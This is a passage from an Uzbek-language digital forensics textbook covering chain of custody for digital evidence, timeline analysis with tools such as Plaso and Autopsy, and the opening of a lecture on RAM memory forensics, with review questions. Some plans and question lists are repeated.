Uchinchidan, sudlar ko‘pincha raqamli dalillarni qabul qilishi uchun uzilmagan CoC bo‘yicha ishonchli dalil talab qiladi. Masalan, Yevropa Ittifoqi elektron dalillarni yig‘ish bo‘yicha chegaralardan o‘tuvchi holatlarga oid qoidalarni uyg‘unlashtirish zarurligini ta’kidlab kelmoqda. Bu faqat ayblov uchun emas, balki ayblanuvchining adolatli sudlanish huquqi uchun ham muhim, chunki dalillar ishonchli va qonuniy yig‘ilgan bo‘lishi shart.
Nihoyat, CoC orqali tekshiruvda ishtirok etgan shaxslar dalilni qanday boshqarganliklari uchun javobgar bo‘ladilar. AQSH Milliy Standartlar va Texnologiyalar Institutiga ko‘ra, dalilga ishlov bergan har bir shaxs bu haqda qayd yozishi kerak.
Agar CoC to‘g‘ri yuritilmasa yoki buzilsa, hatto inkor etib bo‘lmaydigan dalillar ham sudda yaroqsiz yoki rad etilgan bo‘lishi mumkin. Bunday holat bir necha sababga ko‘ra yuz berishi mumkin. Birinchidan, dalil ruxsatsiz qo‘llarga tushsa, uni o‘zgartirish, buzish yoki manipulyatsiya qilish xavfi paydo bo‘ladi; bu esa sudning dalilning haqiqiyligi va yaxlitligiga shubha qilishiga olib keladi. Ikkinchidan, noto‘g‘ri saqlash dalilning buzilishiga yoki yo‘qolishiga sabab bo‘lishi mumkin, ayniqsa muhim jismoniy yoki raqamli materiallar nazorat ostidagi muhitni talab qilganda. Uchinchidan, CoCning yetarli darajada hujjatlashtirilmaganligi dalilning qayerga va qanday ko‘chirilganini aniqlashda bo‘shliqlar paydo qiladi va dalil yig‘ilgandan beri o‘zgarmaganini isbotlashning imkonsizligiga olib keladi.
Shuningdek, CoCdagi nomuvofiqliklar yoki tushuntirilmagan uzilishlar dalilning ishonchliligi borasida asosli shubhalar tug‘dirishi mumkin, bu esa qarshi tomonning huquqiy e’tirozlariga sabab bo‘ladi. Oxir-oqibat, bunday xatolar hatto ishonchli dalillarning ham sud jarayonidan chiqarib tashlanishiga, ayblovning pozitsiyasining zaiflashishiga va ishning dalil yetishmasligi sababli butunlay qulashiga olib kelishi mumkin.
CoCni saqlashdagi qiyinchiliklar
Jismoniy dalillar (qurollar, namunalar va boshqalar) uchun CoCni yuritish o‘nlab yillar davomida rivojlangan bo‘lsada, raqamli dalillar uchun bunday tajriba yetarli darajada shakllanmagan. Raqamli dalillar juda oson o‘zgartirilishi yoki buzilishi mumkin bo‘lgani sababli ular yangi muammolarni keltirib chiqaradi.
Raqamli dalillar nihoyatda sezgir bo‘lib, juda tez o‘zgarishi mumkin. Masalan, bitlar va baytlar hech qanday iz qoldirmasdan o‘zgartirilishi, kompyuterni yoqish bilan vaqt tamg‘alari va loglar o‘zgartirilishi, faylni nusxalash esa uning metadata ma’lumotlarini o‘zgartirib yuborishi mumkin.
Raqamli dalil o‘zgartirilganmi-yo‘qmi, buni aniqlash uchun tergovchilar xesh-ma’lumotlar va loglarni tekshirishlari va hech qanday tasodifiy o‘zgarishlar yuz bermaganini ta’minlash choralarini ko‘rishlari lozim.
Bunga qo‘shimcha ravishda, agar dalilga aralashilgan bo‘lsa, bu o‘zgarishlar odatda maxsus kriminalistik tahlillar o‘tkazilmaguncha sezilmaydi. Bunday tushuntirilmagan bo‘shliq CoCning buzilishiga olib keladi, bu esa ma’lumotlarga zarar yetkazilgan bo‘lishi ehtimolini kuchaytiradi. Buni oldini olish uchun dalil bilan ishlovchi shaxslar ustidan nazorat kuchaytirilishi, jarayonlarda bo‘shliqlar bo‘lmasligi va dalil xavfsiz muhitda saqlanishi talab etiladi.
Yana bir muammo - bulut asosidagi dalillar (elektron pochta, hujjatlar, foydalanuvchi faolligi va boshqalar). Bulutdagi dalillar muhim muloqotlar va qaror qabul qilish jarayonlari haqida ma’lumot berishi sababli tez-tez so‘raladi. Bu holatlarda odatda asl serverdan yoki bulut diskidan nusxa olinadi. Bu CoCni yuritishni yanada murakkablashtiradi, chunki ba’zi holatlarda ma’lumot qanday yig‘ilgani haqida sertifikat yoki tasdiqnoma talab qilinadi va avvalroq kim ma’lumotdan foydalanganini yoki uni kim boshqarganini aniqlash qiyin bo‘lishi mumkin. Bu muammolarga yechim sifatida e-Evidence Reglamentida dalil yig‘ilgandan keyin uning yaxlitligi va sudga yaroqliligini ta’minlash uchun nazorat (custody)ni saqlash talab etilishi belgilangan. Mazkur reglament asosan huquqni muhofaza qiluvchi organlarga qaratilgan bo‘lsada, yaqin yillarda u eDiscovery va raqamli dalillar bilan ishlash jarayonlariga keng ta’sir ko‘rsatishi kutilmoqda. Bulutdagi dalillar uchun CoCni to‘g‘ri yuritish allaqachon murakkab vazifa, ammo ushbu murakkablik chegaralararo dalil almashinuvida yanada ortadi.
Ko‘pincha raqamli dalillar bilan ishlaganda, ularning manbasi boshqa davlatlarda joylashgan bo‘ladi. Turli yurisdiksiyalarda hujjat almashish qoidalari turlicha bo‘lib, CoCni to‘g‘ri saqlashni yanada murakkablashtiradi. Har bir davlatning huquqiy talablarini bilishini kutilishi amalda qiyin. Agar bir xillik bo‘lmasa yoki to‘g‘ri protseduralar bajarilmasa, dalilni qabul qilayotgan davlatning sudi uni yaroqsiz deb topishi mumkin. Yurisadiktsiyalar bo‘ylab dalilning yaroqliligini ta’minlash uchun qoida va protseduralarni uyg‘unlashtirish zarur. Masalan, Yevropa Ittifoqining e-Evidence tizimi a’zo davlatlar o‘rtasida almashinilayotgan dalillar to‘g‘ri nazorat hujjatlari bilan birga bo‘lishini va ularning butun Yevropa bo‘ylab sudda qabul qilinishini ta’minlaydi.
Raqamli tergovlarda ko‘pincha ulkan hajmdagi ma’lumotlar ishtirok etadi va o‘nlab disklar hamda fayllar bo‘yicha CoCni yuritish odamni charchatishi mumkin; bu esa noto‘g‘ri yorliqlash yoki adashtirishga olib keladi. Bozordagi yetakchi eDiscovery vositalari, masalan, RelativityOne, audit funksiyalari orqali barcha o‘zgarishlarni kuzatib, jarayonni tizimlashtirishga yordam beradi. Biroq aksariyat holatlarda CoC insonlar tomonidan yuritiladi, inson xatosi esa eng kichik xatolikning o‘zi bilan ham CoCni buzib qo‘yishi mumkin. Shu sababli o‘qitish va yuqori darajadagi mas’uliyat juda muhimdir.
Yevropa Ittifoqida CoCga oid maxfiylik va huquqiy cheklovlar mavjud. GDPR (General Data Protection Regulation) va milliy ma’lumotlarni himoya qilish qonunlariga ko‘ra, shaxsiy ma’lumotlar faqat qonuniy maqsadlarda ishlatilishi mumkin. Bu yerda, CoC faqat dalillar yaxlitligini saqlash uchun emas, balki ma’lumotlarni ruxsatsiz ko‘rish yoki muhim ma’lumotlarning sizib chiqishiga yo‘l qo‘ymaslik uchun ham muhimdir.
Dalillarni saqlash zanjiri shakllantirish bo‘yicha tavsiyalar
Aloqador shaxslar CoCni buzmasdan saqlashi uchun quyidagi amaliyotlarga rioya qilish tavsiya etiladi:
Har bir harakatni amalga oshirilgan paytida batafsil hujjatlashtirish
Agar dalil bir joydan boshqasiga ko‘chirilsa yoki disk tekshirilyotgan bo‘lsa, bu harakat aniq sana va vaqt bilan qayd etilishi zarur. Bu sud jarayonida dalilning yaxlitligini isbotlash uchun muhimdir.
Raqamli dalillarga boshqa dalillar kabi ehtiyotkorlik bilan muomala qilish
Dalil o‘zgartirilganini ko‘rsatadigan maxsus paketlardan foydalaning, kompyuter yoki disklarni imzo bilan tasdiqlangan dalil paketlariga joylashtiring. Dalillarni qulflangan xonada yoki seyfda saqlang va ulardan foydalanishni cheklang.
Raqamli fayllar esa foydalanishni nazorat qiluvchi serverda xavfsiz saqlanishi kerak. Ruxsatsiz foydalanishni oldini olish uchun shifrlash usullarini qo‘llash mumkin. Shuningdek, ushbu fayllar bo‘yicha audit jurnali yuritilishi lozim.
Asl nusxani o‘zgarmagan holatda saqlang
Tahlil uchun asl faylni o‘zgartirib qo‘ymaslik maqsadida kriminalistik (forensic) nusxalar yaratiladi. Bu yo‘l bilan agar korruptsiya yuz bersa, asl fayl himoyalangan bo‘ladi.
Har bir nusxa hujjatlashtirilishi va uning xeshi asl fayl bilan birga saqlanishi lozim (bu zarurat bo‘lsa moslikni isbotlaydi). Nusxalar ham dalilning bir qismi bo‘lgani uchun ularning har biri uchun alohida CoC yuritilishi kerak.
Dalil bilan ishlaydigan barcha shaxslar yetarli darajada o‘qitilgan bo‘lishi lozim.
Jarayonda ishtirok etuvchi insonlar, kichik bir harakat ham CoCga sezilarli ta’sir ko‘rsatishi mumkinligini bilishlari va uni hujjatlashtirishlari kerak.
Doimiy malaka oshirish mashg‘ulotlari protseduralarga rioya etilishini ta’minlaydi.
Ba’zi agentliklar ISO/IEC 27037:2012 standartiga amal qiladi (unda treyning bo‘yicha tavsiyalar mavjud). 
CoCni tashkilot madaniyatining bir qismiga aylantirish juda muhimdir.
Jarayonlarni xalqaro standartlarga moslashtirish
Masalan, ISO/IEC 27037:2012 raqamli dalillarni aniqlash, yig‘ish, olish va saqlash, shu jumladan CoC bo‘yicha me’yorlarni belgilaydi.
Budapesht kiberjinoyatchilik konvensiyasi esa dalillarni to‘g‘ri boshqarishni va dalil yaxlitligini ta’minlashni talab qiladi.
Bu jarayonlarning butun tashkilot bo‘yicha standartlashuviga va kelajakda sud oldida dalillarga bo‘lgan ishonchni oshirishga yordam beradi.
Shaxsiy ma’lumotlarni himoya qilish
Dalillar amaldagi qonunchilik talablariga muvofiq boshqarilishi lozim.
Yevropa Ittifoqida bu shaxslarning (shaxsiy) ma’lumotlari bilan bog‘liq huquqlarni o‘z ichiga oladi.
Foydalanishni nazorat qilish va ma’lumotlarni minimallashtirish ushbu himoyaga yordam beradi.
Maxfiylik tamoyiliga ko‘ra, shaxsiy ma’lumotlar tegishli darajada himoyalanishi kerak; CoC esa ruxsatsiz foydalanish yoki o‘zgartirishni oldini olish orqali bunga xizmat qiladi.
Bundan tashqari, shaxsiy ma’lumotlarni o‘z ichiga olgan dalillarni chegaralararo uzatishda qonuniy mexanizmlar mavjud bo‘lishi shart (bu ham CoCning alohida elementi hisoblanadi).
Davriy auditlar o‘tkazish
Turli ishlar bo‘yicha CoC izlarini tekshirish orqali jarayonning to‘liqligi va zaif joylari aniqlanishi mumkin.
Bu muammolar haqiqiy muammoga aylanmasdan oldin tuzatish choralarini ko‘rish imkonini beradi.
Ichki va tashqi auditlar sud jarayonida ham foydali bo‘ladi, chunki ular jarayonning izchil va ishonchli ekanligini isbotlab beradi.
Zamonaviy vositalardan foydalanish
Masalan, dalil jurnallarini raqamli imzolash orqali CoCni avtomatlashtiradigan dasturiy vositalar xatolar sonini kamaytiradi.
Shuningdek, dalillarni yozib borishda blockchain texnologiyasidan foydalanish ham foydali yondashuvdir.
Blockchainning o‘zgarmas reestri tufayli biror tomon dalilga oid yozuvlarni o‘zgartira olmaydi.
LOCARD loyihasi (YI tomonidan moliyalashtirilgan) dalil metadata ma’lumotlarini blockchainda saqlash platformasini taqdim etadi. Dalil qayd etilsa yoki uzatilsa, tranzaksiya blockchainga qo‘shiladi, unga aralashishga urinishlar esa darhol ko‘rinadi va CoC buzilganini ko‘rsatadi.
Biroq, texnologiya yordamchi vosita sifatida ko‘rilishi kerak, u hech qachon inson nazoratining o‘rnini bosa olmaydi.
Chain of Custody (CoC) nima va u raqamli kriminalistikada nima uchun muhim?
	•	Raqamli dalillar nega jismoniy dalillarga qaraganda osonroq buzilishi mumkin?
	•	Dalil o‘zgartirilmaganligini isbotlash uchun xesh qiymatlari qanday rol o‘ynaydi?
	•	Bulutdagi (cloud) dalillar CoC jarayoniga qanday qo‘shimcha qiyinchiliklar kiritadi?
	•	Nega asl nusxani emas, balki forensik nusxani tahlil qilish tavsiya etiladi?
	•	ISO/IEC 27037:2012 standarti CoC bo‘yicha qanday ko‘rsatmalar beradi?
	•	Raqamli dalillar bilan ishlashda shaxsiy ma’lumotlarni himoya qilish nima uchun zarur?
	•	Blockchain texnologiyasi CoCni mustahkamlashda qanday foyda keltirishi mumkin?
Nazorat savollari

	•	Chain of Custody (CoC) nima va u raqamli kriminalistikada nima uchun muhim?
	•	Raqamli dalillar nega jismoniy dalillarga qaraganda osonroq buzilishi mumkin?
	•	Dalil o‘zgartirilmaganligini isbotlash uchun xesh qiymatlari qanday rol o‘ynaydi?
	•	Bulutdagi (cloud) dalillar CoC jarayoniga qanday qo‘shimcha qiyinchiliklar kiritadi?
	•	Nega asl nusxani emas, balki forensik nusxani tahlil qilish tavsiya etiladi?
	•	ISO/IEC 27037:2012 standarti CoC bo‘yicha qanday ko‘rsatmalar beradi?
	•	Raqamli dalillar bilan ishlashda shaxsiy ma’lumotlarni himoya qilish nima uchun zarur?
	•	Blockchain texnologiyasi CoCni mustahkamlashda qanday foyda keltirishi mumkin?
Nazorat savollari
9.3. Hodisalarni qayta qurish  (Ma’ruza mashg‘uloti)

1. Raqamli sud ekspertizasida vaqt jadvalini tahlil qilish.
2. Vaqt jadvali ma’lumotlarining asosiy manbalari.
3. Vaqt jadvalini tahlil qilishdagi asosiy usullar.
4. Vaqt jadvalini tahlil qilishda kerakli vositalar va ilovalar.
5. Vaqt jadvalini tahlil qilishdagi murakkabliklar.
Reja:
1. Raqamli sud ekspertizasida vaqt jadvalini tahlil qilish.
2. Vaqt jadvali ma’lumotlarining asosiy manbalari.
3. Vaqt jadvalini tahlil qilishdagi asosiy usullar.
4. Vaqt jadvalini tahlil qilishda kerakli vositalar va ilovalar.
5. Vaqt jadvalini tahlil qilishdagi murakkabliklar.
Reja:

Timeline tahlili, MAC vaqt belgisi (Modified, Accessed, Created), raqamli artefaktlar, log fayllari va tizim jurnallari, hodisa korrelyatsiyasi (event correlation), anti-forensika usullari, vizualizatsiya vositalari (timeline visualization), Forensik vositalar.
Kalit so‘zlar:
Timeline tahlili, MAC vaqt belgisi (Modified, Accessed, Created), raqamli artefaktlar, log fayllari va tizim jurnallari, hodisa korrelyatsiyasi (event correlation), anti-forensika usullari, vizualizatsiya vositalari (timeline visualization), Forensik vositalar.
Kalit so‘zlar:
Raqamli sud ekspertizasida vaqt jadvalini tahlil qilish
Har bir raqamli harakat ortida iz qoldiradi. Hujjat yaratish, web-saytga kirish, USB qurilmasini ulash yoki elektron pochta yuborish kabi jarayonlarning barchasi tizimlar tomonidan yashirin tarzda vaqt belgisi va faoliyat jurnallari sifatida qayd etiladi. Raqamli kriminalistika mutaxassislari uchun bu izlar shunchaki tarqoq bo‘laklar emas, balki ular aytilishni kutayotgan voqea hikoyasining parchalaridir.
Raqamli kriminalistikada vaqt jadvali (timeline) tahlili - raqamli voqealarni xronologik tartibga keltirib, nima bo‘lganini, qachon bo‘lganini va ba’zan qanday sodir bo‘lganini tiklash san’ati va ilmidir. Bu jarayon dastlabki (xom) ma’lumotlarni bir butun hikoyaga aylantiradi va tergovchilarga kiberjinoyatlar hamda fuqaroviy nizolardagi yashirin haqiqatlarni ochishga yordam beradi.
Timeline tahlili nima?
Timeline tahlili - raqamli artefaktlardan voqealar ketma-ketligini qayta tiklash jarayonidir. Tergovchilar ma’lumotlarni to‘plashadi, saralaydilar va tahlil qilib, foydalanuvchi faoliyati yoki tizim voqealarining xronologik ko‘rinishini yaratadilar.
Masalan, kompaniyadan ma’lumot o‘g‘irlangan bo‘lishi mumkin bo‘lgan holatda timeline tahlili quyidagilarni aniqlab berishi mumkin:
	•	xodim tizimga qachon kirgan;
	•	qaysi fayllar o‘qilgan, o‘zgartirilgan yoki ko‘chirib olingan;
	•	tashqi qurilma (USB) qachon ulangan;
	•	fayllar qachon o‘chirib tashlangan yoki uzatilgan.
Bunday bosqichma-bosqich qayta tiklash tergovchilarga aniqlik beradi va sud jarayonlari uchun mustahkam dalil bo‘lib xizmat qiladi.
Vaqt jadvali ma’lumotlarining asosiy manbalari
Raqamli qurilmalar turli ko‘rinishlarda ma’lumot hosil qiladi. Timeline tahlili uchun eng qimmatli manbalardan ba’zilari quyidagilardir:
Fayl metama’lumotlari (MAC vaqt belgisi)
MAC - Modified (o‘zgartirilgan), Accessed (foydalanilgan), Created (yaratilgan) vaqtlarini anglatadi. Bu vaqt belgilaridan fayl qachon tahrirlangan, ko‘rilgan yoki yaratilganini aniqlashda foydalaniladi.
Operatsion tizim jurnallari
Windows Event Logs, Linux syslogs va macOS Unified Logs tizimdagi quyidagi faoliyatlarni qayd etadi:
	•	tizimga kirishlar (logins),
	•	xatoliklar,
	•	o‘chirish yoki qayta yuklash jarayonlari.
Registr va tizim konfiguratsiya fayllari
Windows tizimida reestr (registry) yozuvlari quyidagilar haqida ma’lumot beradi:
	•	dastur qachon o‘rnatilgan,
	•	oxirgi marta qaysi ilovalar ishlatilgan,
	•	foydalanuvchi faoliyati.
Web-brauzer tarixi
Brauzerlar URL manzillar, kuki-fayllar, keshlangan fayllar va yuklab olingan ma’lumotlarni vaqt bilan birga saqlaydi.
Aloqa yozuvlari
Elektron pochta, chat ilovalari va VoIP jurnallari:
	•	xabarlar qachon yuborilgan;
	•	qachon qabul qilingan;
	•	qachon o‘chirilganini ko‘rsatadi.
Ilova jurnallari
Korporativ dasturlar, ma’lumotlar bazalari va ijtimoiy platformalar ish jarayonlarini tiklashda yordam beradigan faoliyat jurnallarini yaratadi.
Tashqi qurilmalar va media vositalari
USB flesh-disklar, SD-kartalar yoki tashqi qattiq disklarning tizimga qachon ulanganligi haqidagi dalillar, ayniqsa ma’lumot o‘g‘irlash holatlarida juda muhimdir.
Ushbu turli manbalarni bir-biriga bog‘lash orqali tergovchilar raqamli faoliyatning aniq va to‘liq tasvirini yaratishlari mumkin.
Vaqt jadvalini tahlil qilishdagi asosiy usullar
Timeline tahlili ishning talabiga qarab bir nechta usullarni o‘z ichiga oladi:
Qo‘lda ko‘rib chiqish (Manual Review)
Tergovchilar loglar, fayllar va vaqt belgilarini qo‘lda tekshiradilar. Kichik ma’lumot to‘plamlari uchun foydali, ammo katta hajmdagi tergovlarda juda ko‘p vaqt talab qiladi.
Avtomatlashtirilgan timeline tuzish
Maxsus vositalar artefaktlarni avtomatik tarzda yig‘ib, tartiblaydi va timeline ko‘rinishida shakllantiradi. Bu vaqtni tejaydi va inson xatosi ehtimolini kamaytiradi.
Hodisalarni korrelyatsiya qilish (Correlation of Events)
Topilmalarni tasdiqlash uchun turli manbalar solishtiriladi. Misol: Agar fayl 11:30 da ko‘chirib olingan bo‘lsa, tergovchilar ayni vaqtda USB qurilmasi ulangan yoki yo‘qligini tekshiradilar.
Vizualizatsiya
Grafikli timeline yoki diagrammalar murakkab ketma-ketliklarni tushunishni osonlashtiradi. Texnik bo‘lmagan auditoriyaga, masalan hakamlarga, dalillarni tushunarli shaklda taqdim etishda foydalidir.
Vaqt jadvalini tahlil qilishda kerakli vositalar va ilovalar
Raqamli timeline yaratish va tahlil qilishda bir qator vositalar kriminalistika mutaxassislariga yordam beradi:
Plaso / log2timeline
Turli ma’lumot manbalarini timeline ko‘rinishiga ifodalash (parse) qilish uchun keng qo‘llaniladigan ochiq manbali vosita.
The Sleuth Kit & Autopsy
Kuchli timeline imkoniyatlariga ega bo‘lgan ochiq manbali kriminalistika paketi.
X-Ways Forensics
Kengaytirilgan timeline filtrlash va korrelyatsiya funksiyalariga ega tijoriy vosita.
Forensic Toolkit (FTK)
Timeline yaratish va tahlil qilish uchun integratsiyalashgan funksiyalarni taklif etadi.
Magnet AXIOM
Mobil va kompyuter artefaktlarini tahlil qilishda mashhur bo‘lib, kuchli timeline vizualizatsiyasiga ega.
Har bir vosita o‘ziga xos afzalliklarga ega, shu sababli tergovchilar ko‘pincha bir nechta vositani natijalarni o‘zaro solishtirish (cross-verification) uchun qo‘llashadi.
Timeline tahlilining real hayotdagi qo‘llanilishi
Kiberjinoyatlar bo‘yicha tergovlar:
	•	tizim aynan qachon buzilganini aniqlash;
	•	malware qachon o‘rnatilgan yoki ishga tushirilganini topish.
Firibgarlik va ichki xodimlar tomonidan sodir etilgan tahdidlar
	•	xodimlar cheklangan moliyaviy ma’lumotlarga kirgan yoki kirmaganini aniqlash;
	•	ruxsatsiz pul o‘tkazmalari bo‘yicha dalillarni topish.
Ma’lumotlar buzilishi (Data Breach) holatlari
	•	buzilish qanday ketma-ketlikda sodir bo‘lganini aniqlash;
	•	o‘g‘irlangan ma’lumot qanday chiqarib ketilganini qayta tiklash.
Fuqaroviy sud ishlari
	•	intellektual mulk o‘g‘irlanishi yoki shartnoma buzilganini isbotlash yoki rad etish.
Baxtsiz hodisa va voqealarni qayta tiklash
Masalan, yo‘l-transport hodisasida haydovchi chalg‘igan bo‘lganini tasdiqlash uchun telefon faoliyatini tahlil qilish.
Qisqacha aytganda, timeline tahlili - kriminalistikadagi voqealar hikoyachisi bo‘lib, tarqoq raqamli dalillarni mantiqiy ketma-ketlikka aylantiradi.
Vaqt jadvalini tahlil qilishdagi murakkabliklar
Ahamiyatiga qaramay, timeline tahlili bir qator muammolar bilan ham birga keladi:
Ma’lumotlar hajmining juda katta bo‘lishi: Zamonaviy tizimlar har kuni millionlab hodisalarni yaratadi. Ular orasidan tegishlilarini ajratib olish juda qiyin vazifa.
Vaqt belgilarining manipulyatsiya qilinishi: Xakerlar ko‘pincha tizim soatini o‘zgartiradi yoki metama’lumotlarni tahrirlaydi, bu esa tergovchilarni chalg‘itishga xizmat qiladi.
Vaqt zonalari farqi: Turli tizimlardan olingan loglar turli vaqt zonalarida bo‘lishi mumkin, shuning uchun ularni yagona vaqt formatiga keltirish zarur.
Quvvatga bog‘liq (vaqtinchalik) ma’lumotlarning yo‘qolishi: Operativ xotira (RAM) yoki vaqtinchalik loglar o‘z vaqtida yig‘ilmasa, butunlay yo‘qolishi mumkin.
Anti-forensika texnikalari: Shifrlash, o‘chiruvchi vositalar yoki log tozalagichlar timeline ma’lumotlarini yashirishi yoki butunlay yo‘q qilishi mumkin.
Bu qiyinchiliklarni yengish uchun ilg‘or vositalar, chuqur tajriba va juda aniq metodologiya talab etiladi.
Samarali timeline tahlili uchun eng yaxshi amaliyotlar
Aniqlik va ishonchlilikni ta’minlash maqsadida kriminalistika mutaxassislari quyidagi amaliyotlarga amal qiladilar:
Asl dalillarni saqlash: Har doim dalilning nusxasini (forensic image) yarating va ishni nusxa ustida olib boring.
Vaqt formatlarini normallashtirish: Vaqt belgilarini umumiy formatga (odatda UTC) o‘tkazing.
Bir nechta vositalardan foydalanish: Bir nechta vosita yordamida natijalarni solishtirib, biror artefakt ko‘zdan qochmaganiga ishonch hosil qiling.
Hujjatlashtirishni yuritish: Jarayonning har bir bosqichini qayd eting (bu shaffoflik va sudda qabul qilinishi uchun zarur).
Doimiy ravishda yangilanib borish: Kiberjinoyatchilik texnikalari rivojlanib borar ekan, yangi kriminalistika vositalari va metodlaridan boxabar bo‘lish uchun muntazam o‘qish va treninglar talab etiladi.
	Timeline tahlilining asosiy maqsadi nima va u kriminalistikada qanday rol o‘ynaydi?
	•	 MAC vaqt belgilarining turlari nimalar va ular fayl haqida qanday ma’lumot beradi?
	•	 Timeline tahlili uchun qaysi turdagi raqamli artefaktlar eng muhim manbalar hisoblanadi?
	•	 Hodisa korrelyatsiyasi nima va u tergov jarayonida nima uchun muhim?
	•	 Timeline tahlilida uchraydigan asosiy qiyinchiliklardan kamida uchtasini sanab bering.
	•	 Anti-forensika texnikalari timeline tahliliga qanday tahdid soladi?
	•	 Timeline tahlilini samarali amalga oshirish uchun qanday eng yaxshi amaliyotlarga amal qilish kerak?
	•	 Plaso, Autopsy va Magnet AXIOM kabi vositalar timeline tahlilida qanday afzalliklarga ega?
Nazorat savollari
	•	Timeline tahlilining asosiy maqsadi nima va u kriminalistikada qanday rol o‘ynaydi?
	•	 MAC vaqt belgilarining turlari nimalar va ular fayl haqida qanday ma’lumot beradi?
	•	 Timeline tahlili uchun qaysi turdagi raqamli artefaktlar eng muhim manbalar hisoblanadi?
	•	 Hodisa korrelyatsiyasi nima va u tergov jarayonida nima uchun muhim?
	•	 Timeline tahlilida uchraydigan asosiy qiyinchiliklardan kamida uchtasini sanab bering.
	•	 Anti-forensika texnikalari timeline tahliliga qanday tahdid soladi?
	•	 Timeline tahlilini samarali amalga oshirish uchun qanday eng yaxshi amaliyotlarga amal qilish kerak?
	•	 Plaso, Autopsy va Magnet AXIOM kabi vositalar timeline tahlilida qanday afzalliklarga ega?
Nazorat savollari

9.4. Xotira kriminalistikasi  (Ma’ruza mashg‘uloti)

1. O‘zgaruvchan xotira. 
2. Xotira iyerarxiyasi. 
3. RAM xotira tuzulishi. 
4. RAM xotirani kriminalistik tahlili. 
5. Bo‘shliq xotira (Memory dump).
Reja:
1. O‘zgaruvchan xotira. 
2. Xotira iyerarxiyasi. 
3. RAM xotira tuzulishi. 
4. RAM xotirani kriminalistik tahlili. 
5. Bo‘shliq xotira (Memory dump).
Reja:

O‘zgaruvchan xotira (Volatile Memory), Virtual xotira va swap (Virtual Memory & Swap), Kernel Space vs. User Space, Xotira dampi (Memory Dump), Process Hollowing / DLL Injection, Faylsiz zararli dastur (Fileless Malware), Qayd yozuvlarni boshqarish (Credential Access, MITRE T1003).
Kalit so‘zlar:
O‘zgaruvchan xotira (Volatile Memory), Virtual xotira va swap (Virtual Memory & Swap), Kernel Space vs. User Space, Xotira dampi (Memory Dump), Process Hollowing / DLL Injection, Faylsiz zararli dastur (Fileless Malware), Qayd yozuvlarni boshqarish (Credential Access, MITRE T1003).
Kalit so‘zlar:
O‘zgaruvchan xotira
Raqamli kriminalistika sohasida tezkor (o‘zgaruvchan) xotira tahlili an’anaviy usullar ko‘rib chiqmaydigan dalillarni aniqlashda ajralmas vositaga aylandi. Tasodifiy foydalanishli xotira, RAM (Random Access Memory) kompyuterning ma’lum bir vaqtdagi holatini tushunishda muhim bo‘lgan, qisqa muddat saqlanadigan katta hajmdagi ma’lumotlarni o‘zida jamlaydi. Qattiq disklar yoki SSDlarda saqlanadigan va tizim o‘chirilgandan keyin ham qoladigan ma’lumotlardan farqli ravishda, RAM tarkibi qurilma o‘chirilishi bilan darhol yo‘qoladi. Shu sababli RAM juda muhim, biroq tahlil qilish qiyin bo‘lgan kriminalistik ma’lumot manbai hisoblanadi.
Xotira iyerarxiyasi
Kompyuterlar ma’lumotni saqlash va ularga murojaat qilishda xotira iyerarxiyasidan foydalanadi, bunda har bir daraja tezlik va sig‘im o‘rtasida muvozanatni taklif qiladi. Ularning eng tezkoridan eng sekinigacha bo‘lgan tartib 9.1-rasmda keltirilgan.
CPU registrlari va kesh xotira juda tezkor, biroq hajmi cheklangan. RAM esa operatsion tizim va faol dasturlar uchun asosiy ishchi xotira hisoblanadi. Disk xotirasi ancha sekin bo‘lsada, uzoq muddatli ma’lumotlarni saqlash uchun ishlatiladi.
Virtual xotira tushunchasi esa mantiqiy (virtual) xotira maydonini anglatadi.

9.1-rasm. Xotira iyerarxiyasi
Dastur ishga tushirilganda, operatsion tizim unga virtual xotira manzillarini ajratadi. Bu manzillar fizik RAMga yoki zarurat tug‘ilganda diskdagi swap maydoniga moslanadi. Swap - bu fizik xotira vaqtincha to‘lib qolganida RAMdagi ma’lumotlarni saqlash uchun diskda ajratilgan maxsus bo‘lakdir (9.2-rasm).
Bu jarayon tizimga RAMning o‘zi ko‘tara olganidan ko‘proq faol jarayonlarni boshqarish imkonini beradi. Shuningdek, jarayonlar go‘yoki o‘zlariga xos ajratilgan xotiraga ega bo‘lgandek ishlaydi, operatsion tizim esa ma’lumotning aslida qayerda saqlanayotganini boshqaradi.


9.2-rasm. Swap xotirani ishlatilishi
Operatsion tizim yuklama va ustuvorlikka qarab ma’lumotlarni RAM va disk o‘rtasida doimiy ravishda ko‘chirib turadi. Bu esa xotira tahliliga ta’sir qiladi, chunki ba’zi kriminalistik artefaktlar RAMda bo‘lishi mumkin, boshqalari esa vaqtinchalik swap fayllarda saqlanadi.
RAM xotira tuzulishi
Kernel vs. Foydalanuvchi sohasi
RAM odatda tergov jarayonlarida asosiy e’tibor qaratiladigan xotiradir. U ikki katta bo‘limga bo‘linadi: kernel va foydalanuvchi sohasi.
Kernel soha - operatsion tizim va past darajadagi xizmatlar uchun ajratilgan. U qurilma drayverlari va xotiraga murojaatlarni boshqaradi.
Foydalanuvchi (User) sohasi - foydalanuvchi yoki ilovalar tomonidan ishga tushiriladigan jarayonlarni o‘z ichiga oladi. Har bir jarayon boshqalardan himoyalangan tarzda o‘ziga tegishli alohida xotira maydoniga ega.
User jarayoni ichida xotira odatda bir nechta mintaqalarga bo‘linadi (9.3-rasm):

9.3-rasm. Xotira tuzilmasi
Stack: funksiyalar argumentlari va qaytish manzillari kabi vaqtinchalik ma’lumotlarni saqlaydi. Funksiyalar chaqilganda o‘sadi, qaytganda kichrayadi.
Heap: ish vaqtida dinamik ajratiladigan xotira, masalan, obyektlar va dastur yaratgan bufferlar uchun ishlatiladi.
Executable (.text): CPU bajaradigan haqiqiy kod yoki ko‘rsatmalar saqlanadigan bo‘lim.
Data sections: global o‘zgaruvchilar va bajariluvchi faylga kerak bo‘ladigan boshqa ma’lumotlar uchun ajratilgan joy.
Ushbu tuzilmani tushunish kriminalistik artefaktlar qayerda joylashgan bo‘lishini aniqlashda muhim ahamiyatga ega. Masalan, shifrlash kalitlari ko‘pincha heap bo‘limida, shell buyruqlari esa stackda uchrashi mumkin.
RAM xotirani kriminalistik tahlili
Yo‘qolib ketishidan avvalgi jonli dalillar
RAMni tahlil qilish tizimning ma’lum bir vaqtdagi holatidan olingan “surat”ni taqdim etadi. Bu quyidagilarni o‘z ichiga oladi:
	•	ishlayotgan jarayonlar va yuklangan bajariluvchi fayllar;
	•	ochiq tarmoq ulanishlari va portlar;
	•	tizimga kirgan foydalanuvchilar va so‘nggi buyruqlar;
	•	shifrni ochish ma’lumotlari, jumladan shifrlash kalitlari
	•	kiritilgan kod yoki faylsiz (fileless) zararli dastur.
